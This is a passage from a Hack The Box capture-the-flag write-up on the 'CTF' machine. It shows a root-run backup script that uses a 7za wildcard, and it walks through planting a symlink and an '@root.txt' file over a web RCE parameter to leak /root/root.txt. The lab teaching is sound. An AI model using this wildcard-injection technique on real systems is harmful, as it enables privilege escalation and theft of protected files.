<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[ldapuser@ctf &#x2F;]$ ls -al</span><br><span class="line">total 32</span><br><span class="line">dr-xr-xr-x.  18 root root  238 Jul 31  2018 .</span><br><span class="line">dr-xr-xr-x.  18 root root  238 Jul 31  2018 ..</span><br><span class="line">drwxr-xr-x.   2 root root 4096 Jul 20 00:07 backup</span><br><span class="line">lrwxrwxrwx.   1 root root    7 Jul 30  2018 bin -&gt; usr&#x2F;bin</span><br><span class="line">dr-xr-xr-x.   5 root root 4096 Oct 16  2018 boot</span><br><span class="line">drwxr-xr-x.  20 root root 3180 Jul 19 23:34 dev</span><br><span class="line">drwxr-xr-x.  90 root root 8192 Dec  9  2018 etc</span><br><span class="line">drwxr-xr-x.   3 root root   22 Jul 30  2018 home</span><br><span class="line">lrwxrwxrwx.   1 root root    7 Jul 30  2018 lib -&gt; usr&#x2F;lib</span><br><span class="line">lrwxrwxrwx.   1 root root    9 Jul 30  2018 lib64 -&gt; usr&#x2F;lib64</span><br><span class="line">drwxr-xr-x.   2 root root    6 Apr 11  2018 media</span><br><span class="line">drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt</span><br><span class="line">drwxr-xr-x.   3 root root   16 Jul 30  2018 opt</span><br><span class="line">dr-xr-xr-x. 119 root root    0 Jul 19 23:33 proc</span><br><span class="line">dr-xr-x---.   7 root root 4096 Dec  9  2018 root</span><br><span class="line">drwxr-xr-x.  31 root root  920 Jul 19 23:34 run</span><br><span class="line">lrwxrwxrwx.   1 root root    8 Jul 30  2018 sbin -&gt; usr&#x2F;sbin</span><br><span class="line">drwxr-xr-x.   2 root root    6 Apr 11  2018 srv</span><br><span class="line">dr-xr-xr-x.  13 root root    0 Jul 19 23:34 sys</span><br><span class="line">drwxrwxrwt.  10 root root 4096 Jul 20 00:06 tmp</span><br><span class="line">drwxr-xr-x.  13 root root  155 Jul 30  2018 usr</span><br><span class="line">drwxr-xr-x.  21 root root 4096 Jul 30  2018 var</span><br><span class="line">[ldapuser@ctf &#x2F;]$</span><br></pre></td></tr></table></figure>
<p>It had a lot of archives, an error log and a script called <code>honeypot.sh</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[ldapuser@ctf backup]$ ls -al</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Jul 20 00:07 .</span><br><span class="line">dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 19 23:57 backup.1563573421.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 19 23:58 backup.1563573481.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 19 23:59 backup.1563573541.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:00 backup.1563573602.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:01 backup.1563573661.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:02 backup.1563573721.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:03 backup.1563573781.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:04 backup.1563573841.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:05 backup.1563573901.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:06 backup.1563573961.zip</span><br><span class="line">-rw-r--r--.  1 root root   32 Jul 20 00:07 backup.1563574022.zip</span><br><span class="line">-rw-r--r--.  1 root root    0 Jul 20 00:07 error.log</span><br><span class="line">-rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh</span><br><span class="line">[ldapuser@ctf backup]$</span><br></pre></td></tr></table></figure>
<p><code>honeypot.sh</code> :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[ldapuser@ctf backup]$ cat honeypot.sh </span><br><span class="line"><span class="comment"># get banned ips from fail2ban jails and update banned.txt</span></span><br><span class="line"><span class="comment"># banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)</span></span><br><span class="line">/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E <span class="string">'[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;'</span> | sort -u &gt; /var/www/html/banned.txt</span><br><span class="line"><span class="comment"># awk '$1=$1' ORS='' /var/www/html/banned.txt &gt; /var/www/html/testfile.tmp &amp;&amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># some vars in order to be sure that backups are protected</span></span><br><span class="line">now=$(date +<span class="string">"%s"</span>)</span><br><span class="line">filename=<span class="string">"backup.<span class="variable">$now</span>"</span></span><br><span class="line">pass=$(openssl passwd -1 -salt 0xEA31 -<span class="keyword">in</span> /root/root.txt | md5sum | awk <span class="string">'&#123;print $1&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># keep only last 10 backups</span></span><br><span class="line"><span class="built_in">cd</span> /backup</span><br><span class="line">ls -1t *.zip | tail -n +11 | xargs rm -f</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the files from the honeypot and backup 'em all</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/uploads</span><br><span class="line">7za a /backup/<span class="variable">$filename</span>.zip -t7z -snl -p<span class="variable">$pass</span> -- *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cleaup the honeypot</span></span><br><span class="line">rm -rf -- *</span><br><span class="line"></span><br><span class="line"><span class="comment"># comment the next line to get errors for debugging</span></span><br><span class="line">truncate -s 0 /backup/error.log</span><br><span class="line">[ldapuser@ctf backup]$</span><br></pre></td></tr></table></figure>
<p>Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use <code>pspy</code>, it was obvious since it’s accessing <code>/root/root.txt</code> to create the password and only root can access that.<br>    Basically one of the things that this script is doing is that it’s backing up all the files in <code>/var/www/html/uploads</code> by using <code>7za</code> to put all the uploads in one archive. Let’s look at the command again :<br><code>7za a /backup/$filename.zip -t7z -snl -p$pass -- *</code><br>    It’s using the wildcard asterisk (<code>*</code>) to get all files. This means that if we can write to <code>/var/www/html/uploads</code> our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the <code>7za</code> command.<br>It’s also using this option : <code>-snl</code>, I checked the manual page for <code>7za</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-snl   Store symbolic links as links</span><br></pre></td></tr></table></figure>
<p>Note that we can’t unzip the created backups, so even if we created a symlink to <code>root.txt</code> in <code>/var/www/html/uploads</code> we won’t be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.<br>After searching for some time I found <a href="https://sevenzip.osdn.jp/chm/cmdline/syntax.htm" target="_blank" rel="noopener">this page</a> which talks about a feature in <code>7z</code> called list files. I thought if I created 2 files, <code>root.txt</code> and <code>@root.txt</code>, <code>root.txt</code> is a <code>symlink</code> to <code>/root/root.txt</code>, when the command is executed and gets to <code>@root.txt</code> it will treat that as a list file option then it will search for <code>root.txt</code> to use it as a list file. However that file isn’t a real list file (that may cause an error), also it’s a <code>symlink</code> to <code>/root/root.txt</code>.<br>I went to <code>/var/www/html/uploads</code> and I didn’t even have read access.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ldapuser@ctf backup]$ cd &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;</span><br><span class="line">[ldapuser@ctf uploads]$ ls -al</span><br><span class="line">ls: cannot open directory .: Permission denied</span><br><span class="line">[ldapuser@ctf uploads]$</span><br></pre></td></tr></table></figure>
<p>so I went back to the <code>RCE</code> requests in burp and tried as <code>apache</code>.<br>I created a <code>symlink</code> to <code>/root/root.txt</code> as <code>root.txt</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inputCmd&#x3D;ln -s &#x2F;root&#x2F;root.txt uploads&#x2F;root.txt&amp;inputOTP&#x3D;91913130</span><br></pre></td></tr></table></figure>
<p>Then I created an empty file and called it <code>@root.txt</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inputCmd&#x3D;touch uploads&#x2F;@root.txt&amp;inputOTP&#x3D;91913130</span><br></pre></td></tr></table></figure>
<p>Let’s check the directory listing now :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">inputCmd&#x3D;ls -la uploads&amp;inputOTP&#x3D;91913130</span><br><span class="line"></span><br><span class="line">total 0</span><br><span class="line">drwxr-x--x. 2 apache apache  39 Jul 20 01:12 .</span><br><span class="line">drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..</span><br><span class="line">-rw-r--r--. 1 apache apache   0 Jul 20 01:12 @root.txt</span><br><span class="line">lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&gt; &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
<p>Everything is fine let’s check the error log :<br><img src="/images/hackthebox/ctf/17.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/friendzone/">Hack The Box - Friendzone</a><br>Next Hack The Box write-up : <a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-07-20</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/code-analysis/" rel="tag">#code-analysis</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/ldap/" rel="tag">#ldap</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/php/" rel="tag">#php</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
